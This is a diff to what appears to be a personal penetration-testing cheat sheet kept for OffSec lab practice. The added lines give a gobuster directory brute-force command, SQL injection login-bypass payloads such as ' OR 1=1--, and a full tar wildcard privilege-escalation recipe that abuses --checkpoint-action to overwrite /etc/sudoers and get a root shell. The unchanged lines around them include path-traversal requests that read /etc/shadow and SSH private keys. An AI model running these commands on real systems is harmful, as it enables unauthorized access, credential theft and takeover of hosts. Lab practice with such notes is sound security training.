@@ -1049,6 +1049,7 @@ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt 
 #identifying endpoints using gobuster
 gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern #pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything
 gobuster dir -u http://192.168.162.143/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt # It has big list
+sudo gobuster dir -w '/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt' -u https://$IP:9090 -t 42 -b 404,403,400 -k --exclude-length 43264 # Cockpit PGPractice offsec
 
 #feroxbuster
 feroxbuster --url HTTP://1.2.3.4/
@@ -1558,6 +1559,7 @@ we can also host a php reverseshell and obtain shell.
 ```
 
 ## SQL Injection
+- Try this SQL Injection techniques [Database](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt)
 
 ```powershell
 admin' or '1'='1
@@ -1582,6 +1584,14 @@ admin' or '1'='1
 ") or ("1"="1"/*
 ") or ("1"="1"#
 ) or '1`='1-
+# regex replace as many as you can with your fuzzer for best results:, Above link
+# <user-fieldname> <pass-fieldname> <username>
+# also try to brute force a list of possible usernames, including possile admin acct names
+<username>' OR 1=1--
+'OR '' = '	Allows authentication without a valid username.
+<username>'--
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR 1=1--
 ```
 
 - Blind SQL Injection - This can be identified by Time-based SQLI
@@ -2673,6 +2683,19 @@ sudo /usr/local/bin/cassandra-web -B 0.0.0.0:1234 -u cassie -p SecondBiteTheAppl
 curl --path-as-is localhost:1234/../../../../../../../../etc/shadow # Opened another shell using netcat like above
 curl --path-as-is localhost:1234/../../../../../../../../home/anthony/.bash_history # Some commands using anthony id_rsa key logged as root
 curl --path-as-is localhost:1234/../../../../../../../../home/anthony/.ssh/id_rsa # Copy the key to kali then loogedin as root
+```
+
+## sudo -l permission with /usr/bin/tar -czvf /tmp/backup.tar.gz *
+- Sudo -l privileges with user, [article](https://medium.com/@Dpsypher/proving-grounds-practice-cockpit-7e777892e485)
+```bash
+# SSH keys generate based on NMAP ssh result
+cd /tmp
+echo "echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > payload.sh
+echo "" > '--checkpoint=1'
+echo "" > '--checkpoint-action=exec=sh payload.sh'
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
+sudo -l # (root) NOPASSWD: ALL
+sudo /bin/bash # Boom we are root
 ```
 
 ---
